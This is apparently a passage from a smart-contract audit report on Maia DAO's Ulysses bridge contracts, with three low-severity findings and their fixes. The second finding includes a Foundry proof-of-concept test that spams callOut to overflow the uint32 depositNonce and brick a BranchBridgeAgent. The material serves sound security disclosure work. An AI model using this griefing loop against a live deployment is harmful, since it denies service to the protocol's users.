### Low-01: Incorrectly labeled input paramaters may become confusing  

In the `RootPort` [contract](https://github.com/code-423n4/2023-09-maia/blob/8f56e88577b1378f44ae68636e6ff86a8c2b9aba/src/RootPort.sol#L86-L101) the natspec, the named input parameters and the input types do not correspond. The `chainId` input variable is actually of an `address` type, and the `localAddress/globalAddress` is of the `uint256` type. These were probably meant to be reversed.

```
    /// @notice Mapping with all global hTokens deployed in the system.
    mapping(address token => bool isGlobalToken) public isGlobalAddress;

    /// @notice ChainId -> Local Address -> Global Address
    mapping(address chainId => mapping(uint256 localAddress => address globalAddress)) public getGlobalTokenFromLocal;

    /// @notice ChainId -> Global Address -> Local Address
    mapping(address chainId => mapping(uint256 globalAddress => address localAddress)) public getLocalTokenFromGlobal;

    /// @notice ChainId -> Underlying Address -> Local Address
    mapping(address chainId => mapping(uint256 underlyingAddress => address localAddress)) public
        getLocalTokenFromUnderlying;

    /// @notice Mapping from Local Address to Underlying Address.
    mapping(address chainId => mapping(uint256 localAddress => address underlyingAddress)) public
        getUnderlyingTokenFromLocal;
```

#### Recommendation

The fix would be to simply rename the input parameters correctly (i.e. just swap `chainId` and `localAddress` around).

---

### Low-02: It may become economically feasible to coerce `depositNonce` to overflow   

On chains where gas costs are hugely reduced, it may become feasible for an attacker to increment the `depositNonce` such that it reaches the max of the `uint32` type it uses. 

Forcing this bricks the target `BranchBridgeAgent` as it can no longer accept any deposits or call out to the `endpoint` contracts.  

This has been evaluated to low, as it does not cause losses and is not profitable at *current gas costs and market conditions*. The attack can impact the availability of the protocol. In addition, while the denial of service impact is high, it must be considered that there is little profit motive for the attacker. It does however still present a possible edge case in a sector where the price of assets (and thus the cost to execute an attack) can be volatile and where new technologies are increasingly lowering gas costs.

Although it is low, a PoC is provided to demonstrate the concept.

#### PoC  

The below code demonstrates that an attacker can force the nonce overflow. 

Assumptions:  
- The chain must have an extremely low gas cost (either through design or market conditions)

The below code block can be placed in the `RootFork.t.sol` file in the `test/ulysses-omnichain` directory. Please take care to set up your local `.env` with an Infura key.  

It can be run with `forge test --match-test testCallOutNonce -vvv`  

```
   function testCallOutNonce() public {
        //Switch to avax
        switchToLzChainWithoutExecutePendingOrPacketUpdate(avaxChainId);

        // Give the attacker some ETH
        vm.deal(address(this), 1000000 ether);
        // Here we simply check the attacker's balance
        uint256 startingBalance = address(this).balance;
        console2.log("Attacker starting balance: ", startingBalance);

        /*  An attacker would now execute the below from an attacking contract
            There are some contraints which will dictate profitability:
            1) the local chain block gas limit  
            2) the cost of gas

            For some layer 2 chains the gas cost can become extremely small
            Even if the block gas limit is reached, it would simply mean 
            that the attacker would need to call `callOut` multiple times from
            the attacking contract, incrementing the nonce by some high amount
            each time. 

            In our example we are incrementing the nonce by some 100_000 in each call.
            The max value held by the `depositNonce` is 4,294,967,295
            
            This is obviously a value that is not expected to be reached during the normal
            course of business, but it is quite achievable by a griefer intending to inflict
            damage on the protocol on a low-tx cost chain.
        */
        for (uint256 i; i < 100_000; i++) {
            avaxMulticallBridgeAgent.callOut{value: 0.2 ether}(payable(address(this)), "", GasParams(2, 1));
            console2.log(avaxMulticallBridgeAgent.depositNonce());
        }

        // Here we simply check the attacker's balance
        uint256 endingBalance = address(this).balance;
        // The cost of the attack: 5 281 735 169 326 183 500 000
        // Not profitable at all in current market conditions,
        console2.log("Cost of attack (fees): ", startingBalance - endingBalance);
        // We can check the nonce here.
        console2.log(avaxMulticallBridgeAgent.depositNonce());
    }

```

From the PoC we can see it will take multiple attempts over some period of time (and some economic resources) to attack successfully. This is impactical in the current environment, but may change in the future.

#### Recommendations  

Increase the size to `uint256`, or prevent empty calls that can be exploited to brick the `branchBridgeAgent` in this way.  

---

### Low-03: There is no validation for the payload size of cross-chain messages

For functions like `addLocalToken` or the `callOut` variants (see [here](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/CoreBranchRouter.sol#L62-L79) and [here](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/BranchBridgeAgent.sol#L209-L227) for examples) where the `payload` can be an arbitrary `bytes` object, there is no implemented validation that the payload size is within the `10_000` limit required by the layer zero `RelayerV2`. 

This may waste gas for users, as execution must continue up to the `RelayerV2` before execution will be [reverted](https://github.com/LayerZero-Labs/LayerZero/blob/48c21c3921931798184367fc02d3a8132b041942/contracts/RelayerV2.sol#L140). It is always better to revert as early as possible.

#### Recommendations  

The best would be to determine the correct fees with the [already implemented](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/BranchBridgeAgent.sol#L161-L173) `BranchBridgeAgent::getFeeEstimate()` before the cross-chain call is initiated (because it will automatically check the payload size). The `getFeeEstimate` is not used anywhere in the protocol, but would prevent multiple issues such as this one. 